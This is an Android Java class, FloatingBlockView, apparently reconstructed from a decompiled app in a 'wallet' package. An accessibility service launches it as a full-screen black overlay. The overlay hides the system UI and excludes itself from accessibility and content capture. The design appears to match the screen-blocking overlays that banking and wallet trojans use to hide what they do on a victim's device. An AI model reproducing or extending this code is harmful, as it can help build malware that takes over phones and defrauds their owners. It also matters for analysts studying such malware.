/**
 * 悬浮按钮 LinearLayout
 * - 全屏遮罩容器，设置系统 UI 隐藏 + 辅助功能/内容捕获不可见
 * - 支持自定义背景 Drawable，默认黑色
 * - 包含内部 StatusBarView 子视图
 * - 监听全局布局以更新系统 UI
 *
 * vendor 原始路径: e0/g.java
 */
package com.guard.wallet.view;

import com.guard.wallet.core.AppUtils;

import android.graphics.drawable.Drawable;
import android.os.Build;
import android.widget.LinearLayout;
import com.guard.wallet.service.MyAccessibilityService;
import java.lang.ref.WeakReference;
import java.util.Objects;
import android.view.View;

public final class FloatingBlockView extends LinearLayout {
    public WeakReference<StatusBarView> statusBarViewRef;

    public FloatingBlockView(MyAccessibilityService service, String hint, Drawable background) {
        super(service);
        this.setOrientation(LinearLayout.VERTICAL);
        this.setGravity(17);
        this.setSystemUiVisibility(4);
        this.setImportantForAccessibility(2);
        if (Build.VERSION.SDK_INT >= 30) {
            this.setImportantForContentCapture(2);
        }
        if (background != null) {
            this.setBackground(background);
        } else {
            this.setBackgroundColor(-16777216);
        }
        this.getViewTreeObserver().addOnGlobalLayoutListener(new LayoutReadyListener(this));
        if (!AppUtils.B(hint)) {
            StatusBarView innerView = new StatusBarView(service, hint);
            innerView.setTag("waiting-block-view");
            this.addView(innerView, 0);
            this.statusBarViewRef = new WeakReference<>(innerView);
        }
    }

    @Override
    public final void onLayout(boolean changed, int l, int t, int r, int b) {
        int childCount = this.getChildCount();
        if (childCount > 0) {
            for (int idx = 0; idx < childCount; idx++) {
                View child = this.getChildAt(idx);
                if (Objects.equals(child.getTag(), "waiting-block-view")) {
                    child.layout(l, t, r, b);
                }
            }
        }
    }
}
